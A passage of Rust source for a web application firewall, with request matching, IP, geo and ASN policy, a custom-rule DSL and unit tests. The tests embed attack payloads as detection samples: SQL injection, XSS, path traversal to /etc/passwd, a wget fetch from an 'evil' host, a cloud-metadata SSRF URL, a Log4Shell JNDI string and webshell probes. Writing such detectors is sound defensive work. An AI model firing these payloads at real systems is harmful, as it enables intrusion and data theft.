        return Some(verdict("XXE 外部实体", "xxe"));
    }
    if cfg.managed.ssti && contains_any_joined(parts, full_separators, SSTI) {
        return Some(verdict("模板注入 SSTI", "ssti"));
    }
    if cfg.managed.nosql && contains_any_joined(&parts[..2], url_separators, NOSQL) {
        return Some(verdict("NoSQL 注入", "nosql"));
    }
    if cfg.managed.ldap && contains_any_joined(parts, full_separators, LDAP) {
        return Some(verdict("LDAP 注入", "ldap"));
    }
    if cfg.managed.java && contains_any_joined(parts, full_separators, JAVA) {
        return Some(verdict("Java 反序列化 / OGNL", "java"));
    }
    if cfg.managed.webshell && contains_any_joined(parts, full_separators, WEBSHELL) {
        return Some(verdict("WebShell / PHP 注入", "webshell"));
    }
    None
}

/// Exactly equivalent to `contains` on `parts.join(separators)`, without
/// building the joined string.
///
/// The evaluator used to materialise `format!("{path}?{query} {ua} {referer}")`
/// on every request. Signatures such as `"union select"` contain the separator
/// themselves, so simply scanning each component separately would drop
/// boundary-spanning matches and weaken detection. This keeps the original
/// semantics: a cheap per-component scan first (which covers virtually every
/// real match), then a boundary scan only for needles that actually contain a
/// separator.
fn contains_joined(parts: &[&str], separators: &[char], needle: &str) -> bool {
    if parts.iter().any(|part| part.contains(needle)) {
        return true;
    }
    if !needle.chars().any(|c| separators.contains(&c)) {
        return false;
    }
    if separators.len() + 1 != parts.len() {
        return false;
    }
    let needle = needle.as_bytes();
    for (index, part) in parts.iter().enumerate() {
        if index + 1 == parts.len() {
            break;
        }
        // A boundary-spanning match must start within the last `len - 1` bytes
        // of this part, so the scan stays proportional to the needle length
        // instead of the component length.
        let earliest = part.len().saturating_sub(needle.len().saturating_sub(1));
        for start in earliest..=part.len() {
            if matches_joined_at(parts, separators, index, start, needle) {
                return true;
            }
        }
    }
    false
}

/// Try to match `needle` starting at byte `offset` of `parts[part_index]`,
/// continuing across the separators between components.
fn matches_joined_at(
    parts: &[&str],
    separators: &[char],
    mut part_index: usize,
    mut offset: usize,
    needle: &[u8],
) -> bool {
    let mut matched = 0usize;
    loop {
        if matched == needle.len() {
            return true;
        }
        let part = parts[part_index].as_bytes();
        if offset < part.len() {
            if part[offset] != needle[matched] {
                return false;
            }
            offset += 1;
            matched += 1;
            continue;
        }
        if part_index + 1 >= parts.len() {
            return false;
        }
        let mut buffer = [0_u8; 4];
        for byte in separators[part_index].encode_utf8(&mut buffer).bytes() {
            if matched == needle.len() {
                return true;
            }
            if byte != needle[matched] {
                return false;
            }
            matched += 1;
        }
        part_index += 1;
        offset = 0;
    }
}

fn contains_any_joined(parts: &[&str], separators: &[char], needles: &[&str]) -> bool {
    needles
        .iter()
        .any(|needle| contains_joined(parts, separators, needle))
}

/// Evaluate a parsed DSL expression against the decoded request fields.
fn eval_dsl(
    expr: &lagran_waf_dsl::Expr,
    fields: &RuleFields<'_, '_>,
    compiled: &WafCompiled,
) -> bool {
    match expr {
        lagran_waf_dsl::Expr::And(parts) => {
            parts.iter().all(|part| eval_dsl(part, fields, compiled))
        }
        lagran_waf_dsl::Expr::Or(parts) => {
            parts.iter().any(|part| eval_dsl(part, fields, compiled))
        }
        lagran_waf_dsl::Expr::Not(inner) => !eval_dsl(inner, fields, compiled),
        lagran_waf_dsl::Expr::Condition { field, op, value } => {
            let op = match op {
                lagran_waf_dsl::Op::Contains => WafOp::Contains,
                lagran_waf_dsl::Op::Equals => WafOp::Equals,
                lagran_waf_dsl::Op::Prefix => WafOp::Prefix,
                lagran_waf_dsl::Op::Suffix => WafOp::Suffix,
                lagran_waf_dsl::Op::In => WafOp::In,
            };
            if op == WafOp::In {
                let Ok(ip) = fields.ip_text.parse::<IpAddr>() else {
                    return false;
                };
                if let Some(nets) = compiled.cidrs.get(value) {
                    return nets.iter().any(|net| net.contains(ip));
                }
                return value
                    .split(',')
                    .any(|part| IpNet::parse(part).is_some_and(|net| net.contains(ip)));
            }
            if let lagran_waf_dsl::Field::Header(name) = field {
                return op.matches(&fields.header_for(name), value);
            }
            let haystack = match field {
                lagran_waf_dsl::Field::Path => fields.path,
                lagran_waf_dsl::Field::Query => fields.query,
                lagran_waf_dsl::Field::UserAgent => fields.ua,
                lagran_waf_dsl::Field::Referer => fields.referer,
                lagran_waf_dsl::Field::Method => fields.method,
                lagran_waf_dsl::Field::Ip => fields.ip_text,
                lagran_waf_dsl::Field::Header(_) => unreachable!(),
            };
            op.matches(haystack, value)
        }
    }
}

pub fn evaluate(cfg: &WafConfig, req: &WafRequest) -> Option<WafVerdict> {
    if !cfg.enabled {
        return None;
    }

    // An explicit allow-list entry bypasses every other check.
    if let Some(ip) = req.ip {
        if cfg.ip_allow.iter().any(|net| net.contains(ip)) {
            return None;
        }
        if cfg.ip_deny.iter().any(|net| net.contains(ip)) {
            return Some(WafVerdict {
                action: WafAction::Block,
                rule_name: "IP 黑名单".into(),
                category: "ip_deny".into(),
            });
        }
    }

    // Geo/ASN policy is a separate layer from the IP lists. An IP allow entry
    // still short-circuits every check above, but a Geo/ASN allow match only
    // clears this layer and never skips the managed or custom rules below.
    // Deny always wins over allow. When the MaxMind databases are unavailable
    // the lookup yields nothing: deny rules cannot match, while an active
    // allow-list gate fails closed (traffic is blocked) until data is loaded.
    // Country codes are stored uppercase by `parse_countries`; compare without
    // allocating a new String per request.
    let country = req.country;
    let country_matches = |list: &[String]| {
        country.is_some_and(|code| list.iter().any(|item| item.eq_ignore_ascii_case(code)))
    };
    if let Some(code) = country {
        if country_matches(&cfg.country_deny) {
            return Some(WafVerdict {
                action: WafAction::Block,
                rule_name: format!("国家/地区黑名单 ({code})"),
                category: "geo_deny".into(),
            });
        }
    }
    if let Some(asn) = req.asn {
        if cfg.asn_deny.contains(&asn) {
            return Some(WafVerdict {
                action: WafAction::Block,
                rule_name: format!("ASN 黑名单 (AS{asn})"),
                category: "asn_deny".into(),
            });
        }
    }
    if cfg.has_geo_allow() {
        let country_ok = country_matches(&cfg.country_allow);
        let asn_ok = req.asn.is_some_and(|asn| cfg.asn_allow.contains(&asn));
        if !country_ok && !asn_ok {
            return Some(WafVerdict {
                action: WafAction::Block,
                rule_name: "Geo/ASN 白名单未命中".into(),
                category: "geo_allow".into(),
            });
        }
    }

    let path = decode_lower_twice(req.path);
    let query = decode_lower_twice(req.query);
    let ua = decode_lower_twice(req.user_agent);
    let referer = decode_lower_twice(req.referer);

    // The managed signatures run over "path?query ua referer". Concatenating
    // that into one String allocated and copied every component on every
    // request. `contains_any_joined` walks the same logical text without
    // materialising it, including matches that straddle a separator.
    let parts: [&str; 4] = [path.as_ref(), query.as_ref(), ua.as_ref(), referer.as_ref()];
    const FULL_SEPS: [char; 3] = ['?', ' ', ' '];
    const URL_SEPS: [char; 1] = ['?'];

    if let Some(verdict) = managed_verdict(cfg, &parts, &FULL_SEPS, &URL_SEPS, &ua, &path) {
        return Some(verdict);
    }
    if cfg.managed.crlf
        && (path.contains('\r')
            || path.contains('\n')
            || query.contains('\r')
            || query.contains('\n'))
    {
        return Some(verdict("CRLF / 头注入", "crlf"));
    }
    if cfg.managed.protocol {
        let has_te = req.headers.contains_key("transfer-encoding");
        let has_cl = req.headers.contains_key("content-length");
        let override_headers =
            req.headers.contains_key("x-original-url") || req.headers.contains_key("x-rewrite-url");
        if (has_te && has_cl)
            || override_headers
            || path.contains('\0')
            || query.contains('\0')
            || path.contains("%00")
            || query.contains("%00")
            || path.len() > 2048
            || query.len() > 8192
        {
            return Some(verdict("协议异常 / 请求走私", "protocol"));
        }
    }

    // Custom rules: highest priority first, first match wins. `finalize`
    // pre-sorts and filters the list during config construction, so the normal
    // path iterates a slice instead of building and sorting a Vec per request.
    let method = decode_lower(req.method);
    let ip_text = match req.ip {
        Some(ip) => Cow::Owned(ip.to_string()),
        None => Cow::Borrowed(""),
    };
    let header_values: Vec<Option<Cow<'_, str>>> = cfg
        .compiled
        .header_names
        .iter()
        .map(|name| {
            req.headers
                .get(name)
                .and_then(|value| value.to_str().ok())
                // Twice, like path/query/ua/referer. A single pass left
                // `%252Fadmin` as `/%2fadmin`, which a rule written as
                // `x-probe contains "/admin"` does not match — the same payload in
                // the path matched because the path is decoded twice. One payload
                // must not be caught in one field and missed in another.
                .map(decode_lower_twice)
        })
        .collect();
    let mut fields = RuleFields {
        req,
        path: path.as_ref(),
        query: query.as_ref(),
        ua: ua.as_ref(),
        referer: referer.as_ref(),
        method: method.as_ref(),
        ip_text: ip_text.as_ref(),
        header_names: &cfg.compiled.header_names,
        header_values: &header_values,
    };
    if cfg.rules_are_finalized() {
        for rule in cfg.rules.iter() {
            if let Some(verdict) = rule_verdict(rule, &mut fields, &cfg.compiled) {
                return Some(verdict);
            }
        }
    } else {
        // Configs built outside `finalize` (tests, direct callers): order them
        // here. This is the cold path and allocates, which is why `finalize`
        // exists.
        let mut rules: Vec<&WafRule> = cfg.rules.iter().filter(|r| r.enabled).collect();
        rules.sort_by_key(|rule| std::cmp::Reverse(rule.priority));
        for rule in rules {
            if let Some(verdict) = rule_verdict(rule, &mut fields, &cfg.compiled) {
                return Some(verdict);
            }
        }
    }

    level_verdict(cfg.security_level, req.method, &path, &ua, req.headers)
}

/// Decoded request components a custom rule can be evaluated against.
///
/// Held by reference so a rule evaluation borrows the already-decoded values
/// instead of cloning one `String` per rule, per request.
struct RuleFields<'a, 'r> {
    req: &'a WafRequest<'r>,
    path: &'a str,
    query: &'a str,
    ua: &'a str,
    referer: &'a str,
    method: &'a str,
    ip_text: &'a str,
    header_names: &'a [String],
    header_values: &'a [Option<Cow<'r, str>>],
}

impl RuleFields<'_, '_> {
    fn header_for(&self, name: &str) -> Cow<'_, str> {
        if let Some(index) = self
            .header_names
            .iter()
            .position(|candidate| candidate.eq_ignore_ascii_case(name))
        {
            return match self.header_values.get(index).and_then(Option::as_ref) {
                Some(Cow::Borrowed(value)) => Cow::Borrowed(value),
                Some(Cow::Owned(value)) => Cow::Borrowed(value.as_str()),
                None => Cow::Borrowed(""),
            };
        }
        Cow::Owned(header_value(self.req.headers, name))
    }

    fn value_for(&self, field: &WafField) -> Cow<'_, str> {
        match field {
            WafField::Path => Cow::Borrowed(self.path),
            WafField::Query => Cow::Borrowed(self.query),
            WafField::UserAgent => Cow::Borrowed(self.ua),
            WafField::Referer => Cow::Borrowed(self.referer),
            WafField::Method => Cow::Borrowed(self.method),
            WafField::Ip => Cow::Borrowed(self.ip_text),
            // Header lookups are rare and already decoded on demand.
            WafField::Header(name) => self.header_for(name),
        }
    }
}

/// Evaluate one custom rule; `None` means it did not match.
fn rule_verdict(
    rule: &WafRule,
    fields: &mut RuleFields<'_, '_>,
    compiled: &WafCompiled,
) -> Option<WafVerdict> {
    let matched = if let Some(expr) = &rule.expr {
        eval_dsl(expr, fields, compiled)
    } else {
        let value = fields.value_for(&rule.field);
        rule.op.matches(&value, &rule.value)
    };
    matched.then(|| WafVerdict {
        action: rule.action,
        rule_name: rule.name.clone(),
        category: "custom".into(),
    })
}

fn verdict(name: &str, category: &str) -> WafVerdict {
    WafVerdict {
        action: WafAction::Block,
        rule_name: name.to_string(),
        category: category.to_string(),
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn cfg() -> WafConfig {
        WafConfig {
            enabled: true,
            mode: WafMode::Block,
            managed: ManagedRules::default(),
            rules: vec![],
            ip_allow: vec![],
            ip_deny: vec![],
            country_allow: vec![],
            country_deny: vec![],
            asn_allow: vec![],
            asn_deny: vec![],
            challenge_difficulty: 4,
            challenge_ttl_secs: 1800,
            security_level: SecurityLevel::Off,
            compiled: Default::default(),
        }
    }

    fn req<'a>(
        headers: &'a HeaderMap,
        path: &'a str,
        query: &'a str,
        ua: &'a str,
    ) -> WafRequest<'a> {
        WafRequest {
            method: "GET",
            path,
            query,
            user_agent: ua,
            referer: "",
            ip: Some("198.51.100.10".parse().unwrap()),
            country: None,
            asn: None,
            headers,
        }
    }

    #[test]
    fn detects_sqli_xss_and_traversal() {
        let c = cfg();
        let h = HeaderMap::new();
        assert_eq!(
            evaluate(
                &c,
                &req(&h, "/search", "q=1%27%20or%20%271%27=%271", "curl")
            )
            .unwrap()
            .category,
            "sqli"
        );
        assert_eq!(
            evaluate(
                &c,
                &req(&h, "/x", "q=%3Cscript%3Ealert(1)%3C/script%3E", "curl"),
            )
            .unwrap()
            .category,
            "xss"
        );
        assert_eq!(
            evaluate(&c, &req(&h, "/../../etc/passwd", "", "curl"))
                .unwrap()
                .category,
            "traversal"
        );
        assert!(evaluate(&c, &req(&h, "/", "", "curl")).is_none());
    }

    /// The joined scan must agree exactly with the previous
    /// `format!("{path}?{query} {ua} {referer}").contains(needle)` behaviour,
    /// including needles that straddle a separator. This guards the security
    /// property the refactor was not allowed to change.
    #[test]
    fn joined_scan_matches_concatenated_semantics() {
        const SEPS: [char; 3] = ['?', ' ', ' '];
        let cases: &[(&str, &str, &str, &str)] = &[
            ("/a", "q=1", "curl", ""),
            ("/search", "q=union select", "curl", ""),
            ("/a", "", "wget http://x", ""),
            ("/a", "x=1", "", "ref"),
            ("", "", "", ""),
            ("/a?", "b", "c", "d"),
            ("/a", "b ", "c", "d"),
            ("/a", "b", "c ", "d"),
            ("/end", "", "", ""),
        ];
        // Needles chosen to exercise per-part matches, boundary matches and
        // non-matches around every separator position.
        let needles = [
            "union select",
            ";wget ",
            ";curl ",
            "?b",
            "b ",
            " c",
            "?",
            " ",
            "a?b",
            "a b",
            "d",
            "zzz",
            "b c",
            "c d",
        ];
        for (path, query, ua, referer) in cases {
            let joined = format!("{path}?{query} {ua} {referer}");
            let parts: [&str; 4] = [path, query, ua, referer];
            for needle in needles {
                assert_eq!(
                    contains_joined(&parts, &SEPS, needle),
                    joined.contains(needle),
                    "mismatch for joined={joined:?} needle={needle:?}"
                );
            }
        }
    }

    /// Same check for the two-component URL form used by SSRF/NoSQL.
    #[test]
    fn joined_scan_matches_url_semantics() {
        const SEPS: [char; 1] = ['?'];
        let cases: &[(&str, &str)] = &[
            ("/proxy", "url=http://169.254.169.254/x"),
            ("/a", ""),
            ("/a?", ""),
            ("/a", "?b"),
            ("", ""),
        ];
        let needles = [
            "169.254.169.254",
            "file://",
            "?url",
            "a?b",
            "?",
            "zzz",
            "$ne",
        ];
        for (path, query) in cases {
            let joined = format!("{path}?{query}");
            let parts: [&str; 2] = [path, query];
            for needle in needles {
                assert_eq!(
                    contains_joined(&parts, &SEPS, needle),
                    joined.contains(needle),
                    "mismatch for joined={joined:?} needle={needle:?}"
                );
            }
        }
    }

    /// `finalize` must preserve "highest priority wins, first match wins".
    #[test]
    fn finalize_sorts_and_drops_disabled_rules() {
        let mut c = cfg();
        c.rules = vec![
            WafRule {
                name: "low".into(),
                field: WafField::Path,
                op: WafOp::Prefix,
                value: "/admin".into(),
                action: WafAction::Log,
                priority: 1,
                enabled: true,
                expr: None,
            },
            WafRule {
                name: "disabled-high".into(),
                field: WafField::Path,
                op: WafOp::Prefix,
                value: "/admin".into(),
                action: WafAction::Block,
                priority: 99,
                enabled: false,
                expr: None,
            },
            WafRule {
                name: "high".into(),
                field: WafField::Path,
                op: WafOp::Prefix,
                value: "/admin".into(),
                action: WafAction::Block,
                priority: 10,
                enabled: true,
                expr: None,
            },
        ];
        c.finalize();
        assert_eq!(c.rules.len(), 2, "disabled rule must be dropped");
        assert_eq!(c.rules[0].name, "high");
        assert_eq!(c.rules[1].name, "low");
        assert!(c.rules_are_finalized());
        let h = HeaderMap::new();
        assert_eq!(
            evaluate(&c, &req(&h, "/admin/x", "", "curl"))
                .unwrap()
                .rule_name,
            "high"
        );
    }

    /// An un-finalized config must still evaluate in priority order, because
    /// tests and direct callers build `WafConfig` by hand.
    #[test]
    fn unsorted_rules_still_respect_priority() {
        let mut c = cfg();
        c.managed = ManagedRules {
            sqli: false,
            xss: false,
            traversal: false,
            scanners: false,
            rce: false,
            ssrf: false,
            xxe: false,
            log4shell: false,
            crlf: false,
            ssti: false,
            nosql: false,
            ldap: false,
            java: false,
            webshell: false,
            protocol: false,
        };
        c.rules = vec![
            WafRule {
                name: "low".into(),
                field: WafField::Path,
                op: WafOp::Prefix,
                value: "/admin".into(),
                action: WafAction::Log,
                priority: 1,
                enabled: true,
                expr: None,
            },
            WafRule {
                name: "high".into(),
                field: WafField::Path,
                op: WafOp::Prefix,
                value: "/admin".into(),
                action: WafAction::Block,
                priority: 10,
                enabled: true,
                expr: None,
            },
        ];
        assert!(!c.rules_are_finalized());
        let h = HeaderMap::new();
        assert_eq!(
            evaluate(&c, &req(&h, "/admin/x", "", "curl"))
                .unwrap()
                .rule_name,
            "high"
        );
    }

    /// `decode_lower` must borrow when nothing changes, and still decode and
    /// lower-case otherwise (including double-encoded payloads).
    #[test]
    fn decode_lower_borrows_when_unchanged() {
        assert!(matches!(decode_lower("/already/lower"), Cow::Borrowed(_)));
        assert_eq!(decode_lower("/MiXeD"), "/mixed");
        assert_eq!(decode_lower("%2F"), "/");
        assert_eq!(decode_lower_twice("%2527"), "'");
        // Invalid escapes stay verbatim rather than being dropped.
        assert_eq!(decode_lower("%zz"), "%zz");
    }

    #[test]
    fn detects_scanners_by_ua_and_path() {
        let c = cfg();
        let h = HeaderMap::new();
        assert_eq!(
            evaluate(&c, &req(&h, "/", "", "sqlmap/1.7"))
                .unwrap()
                .category,
            "scanners"
        );
        assert_eq!(
            evaluate(&c, &req(&h, "/.git/config", "", "curl"))
                .unwrap()
                .category,
            "scanners"
        );
    }

    #[test]
    fn disabled_waf_never_matches() {
        let mut c = cfg();
        c.enabled = false;
        let h = HeaderMap::new();
        assert!(evaluate(&c, &req(&h, "/", "q=union select", "sqlmap")).is_none());
    }

    #[test]
    fn ip_allow_and_deny_lists() {
        let mut c = cfg();
        let h = HeaderMap::new();
        c.ip_deny.push(IpNet::parse("203.0.113.0/24").unwrap());
        let mut r = req(&h, "/", "q=union select", "curl");
        r.ip = Some("203.0.113.9".parse().unwrap());
        let v = evaluate(&c, &r).unwrap();
        assert_eq!(v.category, "ip_deny");

        c.ip_allow.push(IpNet::parse("203.0.113.9").unwrap());
        assert!(evaluate(&c, &r).is_none(), "allow-list bypasses everything");

        // A different address in the denied range is still blocked.
        r.ip = Some("203.0.113.10".parse().unwrap());
        assert_eq!(evaluate(&c, &r).unwrap().category, "ip_deny");
    }

    #[test]
    fn cidr_parsing_and_matching() {
        let net = IpNet::parse("10.0.0.0/8").unwrap();
        assert!(net.contains("10.1.2.3".parse().unwrap()));
        assert!(!net.contains("11.1.2.3".parse().unwrap()));
        assert!(IpNet::parse("10.0.0.0/33").is_none());
        assert!(IpNet::parse("not-an-ip").is_none());

        let v6 = IpNet::parse("2001:db8::/32").unwrap();
        assert!(v6.contains("2001:db8::1".parse().unwrap()));
        assert!(!v6.contains("2001:db9::1".parse().unwrap()));
    }

    #[test]
    fn custom_rule_priority_and_actions() {
        let mut c = cfg();
        c.managed = ManagedRules {
            sqli: false,
            xss: false,
            traversal: false,
            scanners: false,
            ..ManagedRules::default()
        };
        c.rules = vec![
            WafRule {
                name: "allow health".into(),
                field: WafField::Path,
                op: WafOp::Equals,
                value: "/health".into(),
                action: WafAction::Allow,
                priority: 100,
                enabled: true,
                expr: None,
            },
            WafRule {
                name: "block admin".into(),
                field: WafField::Path,
                op: WafOp::Prefix,
                value: "/admin".into(),
                action: WafAction::Block,
                priority: 10,
                enabled: true,
                expr: None,
            },
        ];

        let h = HeaderMap::new();
        assert_eq!(
            evaluate(&c, &req(&h, "/admin/users", "", "curl"))
                .unwrap()
                .rule_name,
            "block admin"
        );
        let allow = evaluate(&c, &req(&h, "/health", "", "curl")).unwrap();
        assert_eq!(allow.action, WafAction::Allow);
        assert!(evaluate(&c, &req(&h, "/public", "", "curl")).is_none());
    }

    #[test]
    fn log_rule_does_not_block() {
        let mut c = cfg();
        c.managed = ManagedRules {
            sqli: false,
            xss: false,
            traversal: false,
            scanners: false,
            ..ManagedRules::default()
        };
        c.rules = vec![WafRule {
            name: "observe api".into(),
            field: WafField::Path,
            op: WafOp::Prefix,
            value: "/api/".into(),
            action: WafAction::Log,
            priority: 0,
            enabled: true,
            expr: None,
        }];
        let h = HeaderMap::new();
        let v = evaluate(&c, &req(&h, "/api/x", "", "curl")).unwrap();
        assert_eq!(v.action, WafAction::Log);
        assert!(!v.is_block());
    }

    #[test]
    fn detects_extended_managed_categories() {
        let c = cfg();
        let h = HeaderMap::new();
        let cases = [
            ("/run", "cmd=wget%20http://evil/x", "rce"),
            ("/proxy", "url=http%3A%2F%2F169.254.169.254%2Fmeta", "ssrf"),
            ("/xml", "data=%3C%21DOCTYPE%20x%20%5B%3C%21ENTITY", "xxe"),
            (
                "/login",
                "user=%24%7Bjndi%3Aldap%3A%2F%2Fevil%7D",
                "log4shell",
            ),
        ];
        for (path, query, category) in cases {
            assert_eq!(
                evaluate(&c, &req(&h, path, query, "curl"))
                    .unwrap()
                    .category,
                category
            );
        }
        assert_eq!(
            evaluate(&c, &req(&h, "/safe", "q=a%0d%0aSet-Cookie:%20x=1", "curl"))
                .unwrap()
                .category,
            "crlf"
        );
    }

    #[test]
    fn merged_matcher_matches_legacy_for_every_managed_category() {
        let mut fast = cfg();
        fast.finalize();
        let slow = cfg();
        let h = HeaderMap::new();
        let cases = [
            ("/search", "q=union%20select", "sqli"),
            ("/x", "q=%3Cscript%3Ealert(1)%3C/script%3E", "xss"),
            ("/../../etc/passwd", "", "traversal"),
            ("/run", "cmd=wget%20http://evil/x", "rce"),
            ("/proxy", "url=http%3A%2F%2F169.254.169.254%2Fmeta", "ssrf"),
            ("/xml", "data=%3C%21DOCTYPE%20x%20%5B%3C%21ENTITY", "xxe"),
            (
                "/login",
                "user=%24%7Bjndi%3Aldap%3A%2F%2Fevil%7D",
                "log4shell",
            ),
            ("/render", "q=%7B%7B7*7%7D%7D", "ssti"),
            ("/api", "q=%7B%22%24ne%22%3A%22x%22%7D", "nosql"),
            ("/login", "user=*%29%28uid%3D*", "ldap"),
            ("/struts", "q=%25%7B%23_memberAccess%7D", "java"),
            ("/upload", "q=%3C%3Fphp%20echo", "webshell"),
            ("/safe", "page=2&q=shoes", "\0none"),
        ];
        for (path, query, expected) in cases {
            let request = req(&h, path, query, "Mozilla/5.0");
            let legacy = evaluate(&slow, &request).map(|v| v.category);
            let merged = evaluate(&fast, &request).map(|v| v.category);
            if expected == "\0none" {
                assert!(merged.is_none(), "merged: {path}?{query}");
            } else {
                assert_eq!(merged.as_deref(), Some(expected), "merged: {path}?{query}");
            }
            assert_eq!(legacy, merged, "legacy/merged disagreement: {path}?{query}");
        }
    }

    #[test]
    fn merged_matcher_preserves_category_priority() {
        let mut fast = cfg();
        fast.finalize();
        let slow = cfg();
        let h = HeaderMap::new();
        // Both SQLi ("union select") and a scanner path signature match.
        let request = req(&h, "/.env", "q=union%20select", "sqlite_sqlmap");
        assert_eq!(evaluate(&slow, &request).unwrap().category, "sqli");
        assert_eq!(evaluate(&fast, &request).unwrap().category, "sqli");
    }

    #[test]
    fn merged_matcher_respects_disabled_groups() {
        let mut fast = cfg();
        fast.managed.sqli = false;
        fast.finalize();
        let h = HeaderMap::new();
        let request = req(&h, "/search", "q=union%20select", "curl");
        assert!(evaluate(&fast, &request).is_none());
    }

    #[test]
    fn header_field_matching() {
        let mut c = cfg();
        c.rules = vec![WafRule {
            name: "block bad key".into(),
            field: WafField::Header("x-api-key".into()),
            op: WafOp::Equals,
            value: "bad".into(),
            action: WafAction::Block,
            priority: 1,
            enabled: true,
            expr: None,
        }];
        let mut h = HeaderMap::new();
        h.insert("x-api-key", "bad".parse().unwrap());
        assert_eq!(
            evaluate(&c, &req(&h, "/", "", "curl")).unwrap().rule_name,
            "block bad key"
        );
        h.insert("x-api-key", "good".parse().unwrap());
        assert!(evaluate(&c, &req(&h, "/", "", "curl")).is_none());
    }

    #[test]
    fn security_level_challenges_documents_but_not_assets() {
        let mut c = cfg();
        c.security_level = SecurityLevel::UnderAttack;
        let mut h = HeaderMap::new();
        h.insert("accept", "text/html".parse().unwrap());
        let v = evaluate(&c, &req(&h, "/index.html", "", "Mozilla/5.0")).unwrap();
        assert_eq!(v.action, WafAction::Challenge);
        assert_eq!(v.category, "security_level");
        // static assets are never challenged
        assert!(evaluate(&c, &req(&h, "/static/app.js", "", "Mozilla/5.0")).is_none());
        // non-GET/HEAD is not challenged by the level
        let mut post = req(&h, "/index.html", "", "Mozilla/5.0");
        post.method = "POST";
        assert!(evaluate(&c, &post).is_none());
    }

    #[test]
    fn security_level_medium_flags_empty_ua() {
        let mut c = cfg();
        c.managed = ManagedRules {
            sqli: false,
            xss: false,
            traversal: false,
            scanners: false,
            rce: false,
            ssrf: false,
            xxe: false,
            log4shell: false,
            crlf: false,
            ssti: false,
            nosql: false,
            ldap: false,
            java: false,
            webshell: false,
            protocol: false,
        };
        c.security_level = SecurityLevel::Medium;
        let h = HeaderMap::new();
        assert_eq!(
            evaluate(&c, &req(&h, "/", "", "")).unwrap().category,
            "security_level"
        );
        assert!(evaluate(&c, &req(&h, "/", "", "Mozilla/5.0")).is_none());
    }

    #[test]
    fn detects_managed_rules_v2() {
        let c = cfg();
        let h = HeaderMap::new();
        let cases = [
            ("/render", "q=%7B%7B7*7%7D%7D", "ssti"),
            ("/api", "q=%7B%22%24ne%22%3A%22x%22%7D", "nosql"),
            ("/login", "user=*%29%28uid%3D*", "ldap"),
            ("/struts", "q=%25%7B%23_memberAccess%7D", "java"),
            ("/upload", "q=%3C%3Fphp%20echo", "webshell"),
            ("/x%00.php", "", "protocol"),
            ("/.aws/credentials", "", "scanners"),
            ("/id_rsa", "", "scanners"),
        ];
        for (path, query, category) in cases {
            assert_eq!(
                evaluate(&c, &req(&h, path, query, "curl"))
                    .unwrap()
                    .category,
                category
            );
        }
        assert!(evaluate(&c, &req(&h, "/products", "page=2&q=shoes", "Mozilla/5.0")).is_none());
    }

    #[test]
    fn managed_rules_can_be_disabled_individually() {
        let mut c = cfg();
        c.managed.ssti = false;
        let h = HeaderMap::new();
        assert!(evaluate(&c, &req(&h, "/render", "q=%7B%7B7*7%7D%7D", "curl")).is_none());
    }

    #[test]
    fn decodes_percent_escapes() {
        assert_eq!(decode_lower("%3Cscript%3E"), "<script>");
        assert_eq!(decode_lower("A%20B"), "a b");
        assert_eq!(decode_lower("100%"), "100%");
    }

    #[test]
    fn rejects_double_encoded_payloads() {
        let c = cfg();
        let h = HeaderMap::new();
        let verdict = evaluate(
            &c,
            &req(
                &h,
                "/search",
                "q=%2527%2520or%2520%25271%2527%253D%25271",
                "Mozilla/5.0",
            ),
        )
        .expect("double-encoded SQLi must be detected");
        assert_eq!(verdict.category, "sqli");
    }

    #[test]
    fn custom_rule_dsl_ip_cidr_in() {
        let mut c = cfg();
        c.rules = vec![WafRule {
            name: "internal cidr".into(),
            field: WafField::Ip,
            op: WafOp::In,
            value: "10.0.0.0/8,198.51.100.0/24".into(),
            action: WafAction::Block,
            priority: 10,
            enabled: true,
            expr: Some(lagran_waf_dsl::parse(r#"ip in "10.0.0.0/8,198.51.100.0/24""#).unwrap()),
        }];
        let h = HeaderMap::new();
        assert_eq!(
            evaluate(&c, &req(&h, "/", "", "curl")).unwrap().rule_name,
            "internal cidr"
        );
        let mut req_bad = req(&h, "/", "", "curl");
        req_bad.ip = Some("203.0.113.5".parse().unwrap());
        assert!(evaluate(&c, &req_bad).is_none());
    }

    #[test]
    fn finalize_precompiles_cidrs_and_header_names() {
        let mut c = cfg();
        c.rules = vec![WafRule {
            name: "compiled".into(),
            field: WafField::Path,
            op: WafOp::Contains,
            value: "/admin".into(),
            action: WafAction::Block,
            priority: 10,
            enabled: true,
            expr: Some(
                lagran_waf_dsl::parse(
                    r#"ip in "10.0.0.0/8,198.51.100.0/24" AND header:x-api-key equals "bad""#,
                )
                .unwrap(),
            ),
        }];
        c.finalize();

        assert_eq!(c.compiled.header_names, ["x-api-key"]);
        assert_eq!(
            c.compiled
                .cidrs
                .get("10.0.0.0/8,198.51.100.0/24")
                .map(Vec::len),
            Some(2)
        );
        let mut headers = HeaderMap::new();
        headers.insert("x-api-key", "BAD".parse().unwrap());
        assert_eq!(
            evaluate(&c, &req(&headers, "/", "", "curl"))
                .unwrap()
                .rule_name,
            "compiled"
        );
    }

    #[test]
    fn custom_rule_dsl_boolean_logic() {
        let mut c = cfg();
        c.rules = vec![WafRule {
            name: "admin without api key".into(),
            field: WafField::Path,
            op: WafOp::Prefix,
            value: "/admin".into(),
            action: WafAction::Block,
            priority: 10,
            enabled: true,
            expr: Some(
                lagran_waf_dsl::parse(
                    r#"path prefix "/admin" AND NOT header:x-api-key equals "ok""#,
                )
                .unwrap(),
            ),
        }];
        let mut h = HeaderMap::new();
        assert_eq!(
            evaluate(&c, &req(&h, "/admin/users", "", "curl"))
                .unwrap()
                .category,
            "custom"
        );
        h.insert("x-api-key", "ok".parse().unwrap());
        assert!(evaluate(&c, &req(&h, "/admin/users", "", "curl")).is_none());
        assert!(evaluate(&c, &req(&h, "/public", "", "curl")).is_none());
    }

    #[test]
    fn rejects_request_smuggling_headers() {
        let c = cfg();
        let mut h = HeaderMap::new();
        h.insert("transfer-encoding", "chunked".parse().unwrap());
        h.insert("content-length", "10".parse().unwrap());
        let verdict =
            evaluate(&c, &req(&h, "/api", "", "Mozilla/5.0")).expect("TE+CL must be rejected");
        assert_eq!(verdict.category, "protocol");
    }
}

#[cfg(test)]
mod geo_policy_tests {
    use super::*;

    fn cfg() -> WafConfig {
        WafConfig {
            enabled: true,
            ..WafConfig::default()
        }
    }

    fn req<'a>(
        headers: &'a HeaderMap,
        country: Option<&'a str>,
        asn: Option<u32>,
        path: &'a str,
        query: &'a str,
    ) -> WafRequest<'a> {
        WafRequest {
            method: "GET",
            path,
            query,
            user_agent: "curl",
            referer: "",
            ip: Some("198.51.100.10".parse().unwrap()),
            country,
